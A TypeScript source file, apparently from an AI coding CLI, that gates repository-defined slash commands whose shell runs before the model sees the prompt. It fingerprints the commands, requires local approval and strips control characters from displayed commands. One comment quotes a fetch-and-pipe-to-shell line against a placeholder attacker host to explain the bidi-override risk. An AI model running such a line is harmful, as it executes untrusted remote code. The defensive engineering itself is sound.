/**
 * Trust decisions for shell substitution in project-declared slash commands.
 *
 * A `.book/commands/*.md` body may contain inline shell spans and fenced shell
 * blocks, which the resolver executes before the prompt reaches the model. That
 * execution predates the permission system: no rule is consulted, no sandbox
 * applies, and nothing is asked. A checked-in command file is therefore
 * repository-controlled code that runs on invocation, and since print/headless
 * hosts expand custom commands through the same resolver, `book -p "/name"`
 * reaches the same shell without a terminal to warn anyone.
 *
 * Project command files consequently need the one-time decision an `.mcp.json`
 * server already needs, recorded in `.book/settings.local.json` under
 * `commands.projectCommands`. That file is gitignored and the repository layer
 * is forbidden from writing the key, so the gated party cannot self-approve.
 *
 * The fingerprint covers the extracted shell, not the whole body: editing what
 * runs invalidates the decision, editing the surrounding prose does not. Prose
 * is prompt text, and the tool calls a model makes from it still have to get
 * past the permission system; re-prompting on every wording change is how a
 * gate teaches people to approve without reading.
 *
 * User-global commands (<BOOK_HOME>/commands) were written by the user and are
 * never gated; a project command that substitutes no shell has nothing to
 * approve and is never gated either.
 */
import { createHash } from 'crypto';
import { join } from 'path';
import { extractShellInjections } from './commands/shell-injection.js';
import { formatSettingsDiagnostics, SettingsRepository } from './settings-repository.js';
import type { CommandSettings, ProjectCommandChoice } from './settings.js';
import type { SlashCommand } from './types/commands.js';

/** Recorded decisions, keyed by command name. */
export type ProjectCommandStore = Record<string, ProjectCommandChoice>;

export interface CommandApprovalSettings {
  commands?: Partial<CommandSettings>;
}

/**
 * Stable digest of exactly the shell a body will run, in order.
 *
 * Kind participates: moving a command between an inline span and a fenced block
 * changes how its output lands in the prompt.
 */
export function projectCommandFingerprint(body: string): string {
  const canonical = JSON.stringify(
    extractShellInjections(body).map((injection) => [injection.kind, injection.command]),
  );
  return createHash('sha256').update(canonical).digest('hex').slice(0, 16);
}

export type ProjectCommandApprovalState = 'not-required' | 'approved' | 'rejected' | 'unknown';

export function evaluateProjectCommandApproval(
  settings: CommandApprovalSettings,
  command: SlashCommand,
): ProjectCommandApprovalState {
  if (command.source !== 'project') return 'not-required';
  if (extractShellInjections(command.body).length === 0) return 'not-required';
  const choice = settings.commands?.projectCommands?.[command.name];
  if (!choice) return 'unknown';
  // A body edited after the decision is a new thing to decide on, not a
  // decision already made.
  if (choice.fingerprint !== projectCommandFingerprint(command.body)) return 'unknown';
  return choice.choice;
}

export interface ProjectCommandApprovalPartition {
  /** Approved by the user: their shell substitution runs. */
  approved: SlashCommand[];
  /** No valid decision recorded: refused until the user makes one. */
  pending: SlashCommand[];
  /** Explicitly refused. */
  rejected: SlashCommand[];
}

/**
 * Partition the commands that are subject to the gate. Commands that need no
 * decision — user-global, or substituting no shell — appear in none of the
 * three lists, so a caller reporting this reports only real decisions.
 */
export function partitionProjectCommands(
  commands: readonly SlashCommand[],
  settings: CommandApprovalSettings,
): ProjectCommandApprovalPartition {
  const partition: ProjectCommandApprovalPartition = { approved: [], pending: [], rejected: [] };
  for (const command of commands) {
    const state = evaluateProjectCommandApproval(settings, command);
    if (state === 'approved') partition.approved.push(command);
    else if (state === 'rejected') partition.rejected.push(command);
    else if (state === 'unknown') partition.pending.push(command);
  }
  return partition;
}

/** Raised instead of running unapproved repository shell. */
export class ProjectCommandApprovalError extends Error {
  constructor(
    readonly commandName: string,
    readonly fingerprint: string,
    readonly state: 'unknown' | 'rejected',
    message: string,
  ) {
    super(message);
    this.name = 'ProjectCommandApprovalError';
  }
}

const MAX_LISTED_COMMANDS = 5;
const MAX_COMMAND_CHARS = 160;
/**
 * Everything that can make rendered text differ from the text that runs:
 * C0 controls and DEL, the separators NEL/LS/PS, and the bidi marks,
 * embeddings, overrides and isolates. An override can display
 * `curl https://evil.example | sh` as something harmless while the approved
 * digest covers the real thing.
 */
const CONTROL_CHARACTERS =
  /[\u0000-\u001f\u007f\u0085\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]+/g;

/**
 * Render repository-authored text for a terminal.
 *
 * The command strings come from a file the gated party wrote, so control
 * characters are stripped before display: an ANSI escape in a command body
 * could otherwise repaint or hide the very lines the user is being asked to
 * judge.
 */
function displayable(command: string): string {
  const flattened = command.replace(CONTROL_CHARACTERS, ' ').trim();
  return flattened.length > MAX_COMMAND_CHARS
    ? `${flattened.slice(0, MAX_COMMAND_CHARS)}…`
    : flattened;
}

export function describeProjectCommandApproval(
  command: SlashCommand,
  state: 'unknown' | 'rejected',
): string {
  const injections = extractShellInjections(command.body);
  const fingerprint = projectCommandFingerprint(command.body);
  const listed = injections.slice(0, MAX_LISTED_COMMANDS);
  // Approving from a truncated view is approving what you did not read, so
  // an abbreviated listing says so and names the file to read instead.
  const abbreviated =
    injections.length > listed.length ||
    listed.some((injection) => displayable(injection.command) !== injection.command);
  const decision = JSON.stringify({ [command.name]: { fingerprint, choice: 'approved' } });
  return [
    state === 'rejected'
      ? `/${command.name} substitutes shell you rejected.`
      : `/${command.name} substitutes shell that has not been approved.`,
    '',
    `  .book/commands/${command.name}.md runs ${injections.length} shell command${
      injections.length === 1 ? '' : 's'
    } to build its prompt.`,
    '  That happens before the model sees anything, outside the permission system',
    '  and outside the sandbox, so it needs a decision first:',
    '',
    ...listed.map((injection) => `    $ ${displayable(injection.command)}`),
    ...(injections.length > listed.length
      ? [`    …and ${injections.length - listed.length} more`]
      : []),
    '',
    `  Approve with: book config set commands.projectCommands '${decision}'`,
    '  Reject it by recording "rejected" instead of "approved".',
    '  Editing what the command runs asks again.',
    ...(abbreviated
      ? [
          `  Not shown verbatim (abbreviated, or unsafe characters stripped) — read`,
          `  .book/commands/${command.name}.md in full before approving.`,
        ]
      : []),
  ].join('\n');
}

/**
 * Fail closed before any substitution happens.
 *
 * A caller that supplies no store is treated as having no decision on file,
 * which refuses rather than runs: an unwired host cannot silently reopen the
 * gate.
 */
export function assertProjectCommandApproved(
  command: SlashCommand,
  settings: CommandApprovalSettings,
): void {
  const state = evaluateProjectCommandApproval(settings, command);
  if (state === 'approved' || state === 'not-required') return;
  throw new ProjectCommandApprovalError(
    command.name,
    projectCommandFingerprint(command.body),
    state,
    describeProjectCommandApproval(command, state),
  );
}

/** Record an approve/reject decision in the project-local settings layer. */
export function persistProjectCommandChoice(
  workspace: string,
  name: string,
  fingerprint: string,
  choice: ProjectCommandChoice['choice'],
): { ok: boolean; error?: string } {
  const path = join(workspace, '.book', 'settings.local.json');
  const result = new SettingsRepository(path).update((candidate) => {
    const commands = (candidate.commands ??= {}) as Record<string, unknown>;
    if (typeof commands !== 'object' || Array.isArray(commands)) {
      throw new Error('settings.local.json "commands" must be an object');
    }
    const projectCommands = (commands.projectCommands ??= {}) as Record<string, unknown>;
    projectCommands[name] = { fingerprint, choice } satisfies ProjectCommandChoice;
  });
  return result.ok
    ? { ok: true }
    : { ok: false, error: formatSettingsDiagnostics(result.diagnostics) };
}
